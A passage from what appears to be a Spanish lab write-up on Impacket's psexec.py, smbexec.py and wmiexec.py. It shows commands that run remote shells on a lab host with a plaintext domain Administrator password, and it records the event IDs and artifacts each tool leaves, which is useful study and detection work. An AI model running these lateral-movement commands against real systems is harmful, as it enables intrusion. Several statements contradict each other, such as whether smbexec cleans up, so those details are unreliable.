| psexec.py | Sí (normalmente ADMIN$) | Shell interactiva | Sí | Sí | Sí (si la sesión se cierra correctamente) | NT AUTHORITY\SYSTEM | tcp/445 |
| smbexec.py | Sí (ADMIN$) | Shell semi-interactiva | Sí (uno por comando ejecutado) | No | Sí | NT AUTHORITY\SYSTEM | tcp/445 |
| wmiexec.py | Sí (ADMIN$) | Shell semi-interactiva | No | No | Sí | Administrator | tcp/135, tcp/445, tcp/50911 (Winmgmt) |

En los siguientes capítulos de este anexo, se procederá a investigar con más detalle cada una de estas herramientas. Para ello, se establecerá una conexión a través del Protocolo de Escritorio Remoto (RDP, por sus siglas en inglés) con el sistema remoto. Esto permitirá explorar en profundidad las huellas que estas herramientas dejan en el sistema y entender mejor cómo funcionan.

### Habilitando el Acceso Remoto al Escritorio (RDP)

Antes de profundizar en el análisis de las herramientas **psexec.py**, **smbexec.py** y **wmiexec.py**, es esencial preparar el entorno de prueba. En este caso, se habilitará el *Acceso Remoto al Escritorio* (RDP, por sus siglas en inglés) en la máquina objetivo. Este paso será importante para observar de primera mano los cambios que ocurren en el sistema durante la ejecución de las herramientas y para verificar los eventos generados.

Para comenzar, se verifica si el puerto `3389`, que es el puerto por defecto para RDP, está abierto en la máquina objetivo. Esto se puede hacer utilizando la herramienta de escaneo de puertos `nmap`. Si el puerto `3389` no está abierto, se procede a habilitarlo.

Para habilitar el puerto RDP, se utiliza la herramienta `crackmapexec` con las credenciales del Administrador del dominio. El comando utilizado es el siguiente:

```bash
r1pfr4n@parrot> crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'  -M rdp -o ACTION=enable;
```

Este comando utiliza el módulo `rdp` de `crackmapexec` para habilitar el *Acceso Remoto al Escritorio* en la máquina objetivo en la dirección IP '10.10.10.100' utilizando las credenciales del usuario 'Administrator' con la contraseña 'Ticketmaster1968'.

Una vez habilitado el RDP, se vuelve a comprobar el estado del puerto `3389` con `nmap`. Ahora debería estar abierto.

Con el puerto RDP abierto, se puede acceder a la máquina objetivo utilizando la herramienta `xfreerdp`:

```bash
r1pfr4n@parrot> xfreerdp /v:10.10.10.100 /u:Administrator 
```

Este comando inicia una **sesión RDP** con la máquina en la dirección IP '10.10.10.100' utilizando las credenciales del usuario 'Administrator'. Durante el proceso de conexión, se le pedirá que **acepte el certificado** de la máquina objetivo. Una vez aceptado el certificado y proporcionada la contraseña, se obtendrá una interfaz gráfica de la máquina objetivo.

Con el acceso RDP habilitado, se puede observar directamente los cambios que ocurren en el sistema durante la ejecución de las herramientas y verificar los eventos generados. Esto será de gran utilidad en el análisis detallado de las herramientas que se realizará a continuación.

### psexec.py

**psexec.py** es una herramienta de Impacket que permite la **ejecución de comandos en una máquina remota**. Funciona escribiendo un **binario** con un nombre aleatorio en el **recurso compartido ADMIN$**. Sin embargo, si no se puede escribir en ADMIN$, psexec.py intentará escribir el binario en otros recursos compartidos, incluyendo 'C$', 'NETLOGON' y 'SYSVOL'.

El binario establece un pipe con nombre que es utilizado por el SVCManager para crear un **nuevo servicio**. Este pipe con nombre puede ser utilizado por el usuario para ejecutar comandos de forma remota. Todo el input y output de los comandos ocurre a través del pipe con nombre vía SMB (445/TCP). 

El comando de Impacket para **PsExec.py** es:

```bash
r1pfr4n@parrot> psexec.py 'Administrator:Ticketmaster1968@10.10.10.100'
```

Este comando establece una sesión remota con la máquina en la dirección IP '10.10.10.100' utilizando las credenciales del usuario 'Administrator' con la contraseña 'Ticketmaster1968'. 

Al ejecutar este comando, se crea un binario con un nombre aleatorio (en este caso, 'xtNjoDPp.exe') en el recurso compartido ADMIN$. Además, se crea un nuevo servicio (en este caso, 'fbNJ') en el sistema remoto:

![imagen 13](Pasted image 20230720134638.png)

Verificación de la creación del binario **xtNjoDPp.exe** en el recurso compartido ADMIN$:

![imagen 14](Pasted image 20230720135413.png)

Para verificar la **creación del servicio** en el sistema remoto, se puede utilizar el siguiente comando de PowerShell:

```powershell
C:\> Get-Service | Where-Object {$_.Name -eq "fbNJ"}
```

Este comando lista todos los servicios en el sistema y filtra los resultados para mostrar solo el servicio con el nombre 'fbNJ'. Si el servicio se ha creado correctamente, debería aparecer en los resultados:

![imagen 15](Pasted image 20230720141122.png)

Es importante recordar que el nombre del servicio ('fbNJ' en este caso) es generado aleatoriamente por PsExec.py, por lo que cambiará en cada ejecución del comando. 

La ejecución de **PsExec.py** genera **varios eventos en el sistema** remoto que pueden ser vistos en el **Visor de Eventos de Windows**.

Se genera un evento del sistema con el ID 7045 (Service Started) cuando se crea el nuevo servicio:

![imagen 16](Pasted image 20230720143129.png)

Además, se generan varios eventos de seguridad, incluyendo:

- Evento 4672: Se asignaron derechos especiales de inicio de sesión a una nueva cuenta.
- Evento 4624: Se realizó un inicio de sesión.
- Evento 4634: Se realizó un cierre de sesión.

![imagen 17](Pasted image 20230720144619.png)

**En total:**

* 1 IDs de Eventos de Sistema: 7045 (Servicio Iniciado)
* 12 IDs de Eventos de Seguridad: 4672 (Inicio de sesión con privilegios especiales), 4624 (Inicio de sesión), 4634 (Cierre de sesión)

Una característica importante de **PsExec.py** es que **realiza una limpieza después de su uso**. Cuando se cierra la sesión de PsExec.py correctamente utilizando el comando `exit`, el **binario** y el **servicio** que se crearon en el sistema remoto **se eliminan**. Esto minimiza la cantidad de artefactos dejados en el sistema remoto, aunque es importante tener en cuenta que la creación de un servicio y el tráfico de red generado pueden ser detectados por sistemas de seguridad y detección de intrusiones.

![imagen 18](Pasted image 20230720145431.png)

### smbexec.py

**smbexec.py** es una herramienta de Impacket que permite la **ejecución de comandos en una máquina remota**. A diferencia de **psexec.py**, que escribe un binario en el recurso compartido ADMIN$, **smbexec.py** permite la **ejecución de código remoto** a través de una shell semi-interactiva **creando servicios que ejecutan comandos enviados por el atacante**. 

Lo que distingue a smbexec.py es que **para cada comando** que un usuario ejecuta, **se crea un servicio diferente**. Después de la ejecución del comando, los archivos creados desaparecen, lo que hace que la herramienta sea más discreta y menos propensa a dejar rastros detectables.

El comando de Impacket para **smbexec.py** es:

```bash
r1pfr4n@parrot> smbexec.py 'Administrator:Ticketmaster1968@10.10.10.100'
```

Este comando establece una sesión remota con la máquina en la dirección IP '10.10.10.100' utilizando las credenciales del usuario 'Administrator' con la contraseña 'Ticketmaster1968'. 

![imagen 19](Pasted image 20230720171236.png)

Al ejecutar este comando, se establece una conexión con el servidor remoto y se registran **tres eventos** de Windows. El primero es un inicio de sesión exitoso (ID de evento de seguridad 4624) con el tipo de inicio de sesión 3:

![imagen 20](Pasted image 20230720175808.png)

El segundo es la creación de un servicio en el registro del sistema con el ID de evento 7045. Este evento indica que se ha creado un nuevo servicio en el sistema remoto, que es utilizado para ejecutar los comandos.

![imagen 21](Pasted image 20230720174609.png)

Finalmente, se registra un evento en el registro del sistema con el ID de evento 7009. Este evento indica que el sistema no pudo responder a la solicitud de inicio o control del servicio en el tiempo esperado.

El evento de creación de servicio (ID de evento 7045) contiene el nombre del servicio y el nombre del archivo de servicio o binPath para el servicio, que es el comando a ejecutar. En este caso, el comando es `%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat`.

![imagen 22](Pasted image 20230720175035.png)

Este comando es un poco complejo, pero básicamente lo que hace es lo siguiente:

1. Crea un archivo de comandos temporal (`execute.bat`) en el directorio temporal del sistema (`%TEMP%`), que contiene el comando que queremos ejecutar. En este caso, el comando es `cd`, que nos muestra el directorio actual.
2. Ejecuta el archivo de comandos temporal.
3. Elimina el archivo de comandos temporal.
4. Obtiene los resultados del comando de un archivo especial (`__output`) que se crea en el directorio raíz del disco C.
5. Elimina el archivo especial.

Por ejemplo, si un usuario ejecutara el comando `netstat -natp tcp`, el archivo `execute.bat` contendría el comando `netstat -natp tcp > \\127.0.0.1\C$\__output 2> &1`. Este comando redirige la salida del comando `netstat -natp tcp` al archivo `__output`. Una vez que se ejecuta el comando, el archivo `__output` contendría la salida del comando `netstat -natp tcp`, que mostraría todas las conexiones TCP activas y los puertos TCP en los que el equipo está escuchando.

Este proceso es la razón por la que **smbexec.py** solo puede utilizar rutas absolutas. Como se está ejecutando un archivo de comandos en el directorio temporal del sistema, no tiene conocimiento del directorio de trabajo actual. Por lo tanto, todos los comandos deben especificar la ruta completa al archivo o directorio que quieren acceder.

El nombre del servicio, `BTOBTO`, es un nombre de servicio codificado. El nombre del archivo de servicio o el binPath para el servicio es el comando a ejecutar. Todos estos nombres, `BTOBTO`, `__output` y `execute.bat`, podrían cambiarse fácilmente. También se puede cambiar el nombre del servicio utilizando el switch `-service-name`.

```bash
r1pfr4n@parrot> smbexec.py -service-name 'CustomServiceName' 'Administrator:Ticketmaster1968@10.10.10.100'
```

Resultado:

![imagen 23](Pasted image 20230720181659.png)

Los artefactos generados por **smbexec.py** incluyen:

- Eventos de inicio de sesión exitoso (ID de evento de seguridad 4624) con el tipo de inicio de sesión 3.
- Creación de un servicio en el registro del sistema con el ID de evento 7045.
- Un evento en el registro del sistema con el ID de evento 7009.
- El archivo `C:\windows\temp\execute.bat` que contiene el comando a ejecutar.
- El archivo `C:\__output` que contiene los resultados del comando.

**En total:**

* 3 IDs de Eventos de Sistema: 7045 (Servicio Iniciado), 7009 (Tiempo de espera alcanzado), 4624 (Inicio de sesión)
* 2 IDs de Eventos de Seguridad: 4634 (Cierre de sesión), 4672 (Inicio de sesión con privilegios especiales)

A diferencia de **psexec.py**, **smbexec.py** no realiza una limpieza después de su uso. Si el comando falla antes de la limpieza, los archivos `execute.bat` y `__output` no se eliminarán, dejando artefactos en el sistema remoto.

Para obtener una visión más detallada de cómo **smbexec.py** crea y ejecuta estos servicios, se puede utilizar la opción `-debug` al ejecutar el comando. Esto mostrará la creación y ejecución de los servicios en tiempo real. Por ejemplo:

```bash
r1pfr4n@parrot> smbexec.py 'Administrator:Ticketmaster1968@10.10.10.100' -debug 
```

![imagen 24](Pasted image 20230720183316.png)


Este análisis detallado de **smbexec.py** se ha basado en la información proporcionada en el [artículo](https://u0041.co/blog/post/2) de U0041. 

### wmiexec.py

**wmiexec.py** es otra herramienta de Impacket que permite la **ejecución de comandos en una máquina remota**. Esta herramienta utiliza la Instrumentación de Administración de Windows (WMI, por sus siglas en inglés) para llevar a cabo su tarea. Para entender cómo funciona, primero debemos entender qué es WMI.

WMI es una infraestructura de administración de Windows que permite a los administradores de sistemas gestionar tanto local como remotamente las computadoras Windows. WMI proporciona una forma estandarizada de interactuar con el sistema operativo, los servicios y las aplicaciones, lo que permite a los administradores automatizar tareas y recopilar información del sistema.

El funcionamiento de **wmiexec.py** se basa en la capacidad de WMI para negociar un puerto aleatorio (>1024) con el cliente a través de una conexión inicial a RCP (135/TCP). Esto significa que WMI y RCP son esenciales para el funcionamiento de **wmiexec.py**.

El comando de Impacket para **wmiexec.py** es:

```bash
r1pfr4n@parrot> wmiexec.py 'Administrator:Ticketmaster1968@10.10.10.100'
```

Este comando establece una sesión remota con la máquina en la dirección IP '10.10.10.100' utilizando las credenciales del usuario 'Administrator' con la contraseña 'Ticketmaster1968'. 

Cuando se ejecuta un comando a través de **wmiexec.py**, **el comando se ejecuta con cmd.exe** y la **salida se escribe en un archivo en el recurso compartido ADMIN\$ de SMB**. El nombre del archivo comienza con \_\_, seguido de la marca de tiempo. Esto significa que **wmiexec.py** no necesita escribir en el disco ni crear un nuevo sistema para ejecutar comandos, lo que reduce la posibilidad de detección por parte de herramientas de seguridad como Windows Security Essentials y Bit9.

**wmiexec.py** genera varios eventos de seguridad en el sistema remoto, incluyendo:

- Evento 4672: Se asignaron derechos especiales de inicio de sesión a una nueva cuenta.
- Evento 4624: Se realizó un inicio de sesión.
- Evento 4634: Se realizó un cierre de sesión.

![imagen 25](Pasted image 20230720190757.png)

El resultado es: 

* 22 ID de eventos de seguridad: 4672 (Inicio de sesión con privilegios especiales), 4624 (Inicio de sesión), 4634 (Cierre de sesión)

Este análisis detallado de **wmiexec.py** se ha basado en la información proporcionada en el [artículo](https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986) de Ally Petitt y en el [artículo](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/) de VK9 Security. 

### Conclusiones

Las herramientas **psexec.py**, **smbexec.py** y **wmiexec.py** de Impacket ofrecen diferentes métodos para la ejecución de comandos en una máquina remota. Cada una de estas herramientas tiene sus propias ventajas y desventajas, y la elección de la herramienta a utilizar dependerá de las circunstancias específicas y los requisitos del usuario.

* **psexec.py** es una herramienta poderosa que permite la ejecución de comandos con privilegios de SYSTEM, pero deja rastros evidentes en el sistema remoto, como la creación de un binario y un servicio. Sin embargo, realiza una limpieza automática si la sesión se cierra correctamente, lo que puede ayudar a minimizar su huella.

* **smbexec.py**, por otro lado, no crea un binario, lo que puede hacerla menos detectable. Sin embargo, al igual que psexec.py, crea un servicio en el sistema remoto. Aunque realiza una limpieza automática, si el comando falla antes de la limpieza, los archivos no se eliminarán, dejando artefactos en el sistema remoto. Además, smbexec.py tiene la limitación de que solo puede utilizar rutas absolutas. Esto significa que todos los comandos deben especificar la ruta completa al archivo o directorio que quieren acceder, lo que puede ser un inconveniente en algunos casos.

* **wmiexec.py** no crea un binario ni un servicio, lo que la hace menos detectable que las otras dos herramientas. Sin embargo, requiere acceso de escritura al recurso compartido ADMIN$, lo que puede limitar su utilidad en algunos escenarios. Además, a diferencia de las otras dos herramientas, wmiexec.py proporciona acceso como Administrator en lugar de SYSTEM.

Es importante tener en cuenta que estas no son las únicas herramientas de Impacket para la ejecución remota de comandos. Impacket también ofrece **atexec.py** y **dcomexec.py**, que proporcionan métodos adicionales para la ejecución remota de comandos. Estas herramientas serán explicadas en próximos artículos.

### Bibliografía

Este análisis comparativo de **psexec.py**, **smbexec.py** y **wmiexec.py** se ha basado en la información proporcionada en los siguientes artículos:

- [Windows Remoting: Difference between psexec, wmiexec, atexec, *exec](https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986) por Ally Petitt
- [Impacket Remote code execution (RCE) on Windows from Linux](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/) por VK9 Security
- [Impacket smbexec.py](https://u0041.co/blog/post/2) por u0041
- [Insider Threats: Stealthy Password Hacking With Smbexec](https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec) por Varonis

